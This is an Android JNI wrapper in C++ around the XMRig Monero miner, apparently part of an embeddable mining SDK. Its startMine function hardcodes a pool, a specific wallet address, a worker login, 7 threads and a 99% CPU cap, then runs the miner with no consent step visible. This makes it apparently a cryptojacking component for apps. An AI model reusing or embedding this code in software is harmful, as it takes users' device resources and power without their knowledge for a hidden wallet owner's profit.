/* XMRig
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2016-2017 XMRig       <support@xmrig.com>
 *
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"
#include "common/log/AndroidLog.h"

jobject jcallback_obj;
JNIEnv* jenv;

extern "C" {
    JNIEXPORT void JNICALL Java_waterhole_miner_monero_NewXmr_startMine(JNIEnv *env, jobject thiz, jobject callback) {
        /**
         * test: ./xmrig --api-port 556 -o pool.monero.hashvault.pro:3333 -u 46Ffvb3jf7ZcVqgPjeReAfZyAk7qKm4FqMb6g6SsT6bpKAhPo9EtNKUVEdMpk62zPpB9GJt75xTD75vYHKredVB3RDHfxdY -p worker1:651043704@qq.com -k
         */
         jenv = env;
         jcallback_obj = callback;

         int argc = 14;
         char *argv[] = {
            (char*)"./xmrig",
            (char*)"--api-port", (char*)"556",
            (char*)"-o", (char*)"pool.monero.hashvault.pro:3333",
            (char*)"-u", (char*)"46Ffvb3jf7ZcVqgPjeReAfZyAk7qKm4FqMb6g6SsT6bpKAhPo9EtNKUVEdMpk62zPpB9GJt75xTD75vYHKredVB3RDHfxdY",
            (char*)"-p", (char*)"worker1:651043704@qq.com",
            (char*)"--thread", (char*)"7",
            (char*)"--max-cpu-usage", (char*)"99",
            (char*) "-k"};
         App app(argc, argv);
         app.exec();
    }

    JNIEXPORT void JNICALL Java_waterhole_miner_monero_NewXmr_stopMine(JNIEnv *env, jobject thiz) {
        jcallback_obj = NULL;
    }
}

int assert_call_on_java() {
    if (jenv == NULL || jcallback_obj == NULL) {
        return 0;
    }
    return 1;
}

void on_mining_start() {
    if (assert_call_on_java()) {
        jclass jcallback = jenv->GetObjectClass(jcallback_obj);
        jmethodID mid = jenv->GetMethodID(jcallback, "onMiningStart", "()V");
        jenv->CallVoidMethod(jcallback_obj, mid);
        jenv->DeleteLocalRef(jcallback);
    }
}

void on_mining_error(const char* error) {
    if (assert_call_on_java()) {
        jclass jcallback = jenv->GetObjectClass(jcallback_obj);
        jmethodID mid = jenv->GetMethodID(jcallback, "onMiningError", "(Ljava/lang/String;)V");
        jstring newerror = jenv->NewStringUTF(error);
        jenv->CallVoidMethod(jcallback_obj, mid, newerror);
        jenv->DeleteLocalRef(newerror);
        jenv->DeleteLocalRef(jcallback);
    }
}

void on_mining_status(const double speed) {
    if (assert_call_on_java()) {
        jclass jcallback = jenv->GetObjectClass(jcallback_obj);
        jmethodID mid = jenv->GetMethodID(jcallback, "onMiningStatus", "(D)V");
        jenv->CallVoidMethod(jcallback_obj, mid, speed);
        jenv->DeleteLocalRef(jcallback);
    }
}

void on_submit(const char* job_id,const char* s1,const char* s2,const char* s3) {
    if (assert_call_on_java()) {
    }
}

